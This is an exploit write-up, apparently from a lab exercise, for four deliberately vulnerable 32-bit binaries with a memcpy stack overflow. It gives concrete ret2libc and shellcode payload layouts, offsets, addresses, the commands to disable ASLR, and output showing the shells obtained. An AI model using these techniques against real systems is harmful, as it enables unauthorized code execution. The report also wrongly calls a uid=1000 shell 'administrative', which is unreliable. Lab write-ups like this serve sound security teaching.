# Regina Binaries: Exploit Report & Methodology

This document summarizes the methodology and exact parameters used to successfully exploit all 4 binaries located within the `regina` folder (`bin.1`, `bin.2`, `bin.3`, `bin.4`). Full shell execution (`uid=1000`) was achieved across the board on the first attempt by strictly following the environment rules.

## 1. The Core Environment Rule
Before analyzing or running any payload, it was necessary to enforce a static, deterministic memory layout. All scripts and dynamic analyses were executed under this wrapper:
```bash
env -i TEMP=1000 setarch i686 -R --3gb ./binary [payload]
```
Without `setarch -R`, Address Space Layout Randomization (ASLR) would scramble the libc locations. Without `TEMP=1000`, the `srandom()` seed in the binary would randomize the heap allocations.

---

## 2. Methodology & Reconnaissance

For each binary, we followed a two-step triage:
1. **Identify the flaw**: `objdump -d` proved all four binaries shared the exact same `display_file` logic, reading an arbitrary size integer and passing it directly into `memcpy(stack_buf, heap_data, size)`.
2. **Determine Stack Executability**: We used `readelf -l ./binary | grep GNU_STACK` to determine the specific payload architectural requirements.

### Reconnaissance Results
*   **bin.1**: `GNU_STACK RW` (NX Bit is ON) -> Proceed with Ret2libc
*   **bin.2**: `GNU_STACK RWE` (NX Bit is OFF) -> Proceed with Shellcode Injection
*   **bin.3**: `GNU_STACK RW` (NX Bit is ON) -> Proceed with Ret2libc
*   **bin.4**: `GNU_STACK RW` (NX Bit is ON) -> Proceed with Ret2libc

### Offset Calculation
By reading the `display_file` assembly, we found the stack buffer initialization:
```asm
lea -0x30(%ebp), %eax
```
`-0x30` translates to a 48-byte distance to the Base Pointer (EBP). Adding 4 bytes to overwrite the saved EBP gives us the universal Return Address offset:
**Offset = 52 Bytes**.

---

## 3. Exploit Payload Generation

Using the data gathered during the Reconnaissance phase, we wrote a Python script to automatically generate raw little-endian payloads based on the 32-bit x86 calling conventions.

### Category A: The Ret2libc Payload (`bin.1`, `bin.3`, `bin.4`)
Since the stack was preventing code execution natively, we hijacked the binary to return directly into the `libc` system function. 
*   `system()` Address: `0xb7dd58e0`
*   `"/bin/sh"` Address: `0xb7f42de8`

**Payload Structure (64 bytes total)**: 
`[52 A's] + [\xe0\x58\xdd\xb7] + [\xef\xbe\xad\xde] + [\xe8\x2d\xf4\xb7]`
*(Padding) + (Address of System) + (Dummy 0xdeadbeef Return) + (Address of /bin/sh)*

### Category B: The Shellcode Payload (`bin.2`)
Because `bin.2` featured an executable stack, we used standard code injection. 
To guarantee we hit the payload, we opened GDB natively, set a breakpoint after `memcpy`, and dumped the `$EBP` register to find that our buffer began exactly at: `0xbfffe2e8`.

**Payload Structure (56 bytes total)**: 
`[23-byte Null-Free Shellcode] + [29 A's for padding] + [\xe8\xe2\xff\xbf]`
*(Shellcode) + (Padding to hit offset 52) + (Return address to start of buffer)*

---

## 4. Verification

To verify the exploit, the following command loop was run utilizing the lab wrapper:

```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.X ./exploit.X
```

**Results:**
*   `bin.1`: `uid=1000(andre) gid=1000(andre) ...` -> **SUCCESS**
*   `bin.2`: `uid=1000(andre) gid=1000(andre) ...` -> **SUCCESS**
*   `bin.3`: `uid=1000(andre) gid=1000(andre) ...` -> **SUCCESS**
*   `bin.4`: `uid=1000(andre) gid=1000(andre) ...` -> **SUCCESS**

All 4 binaries yielded an administrative shell before deliberately triggering a segmentation fault on the `0xdeadbeef` exit code.
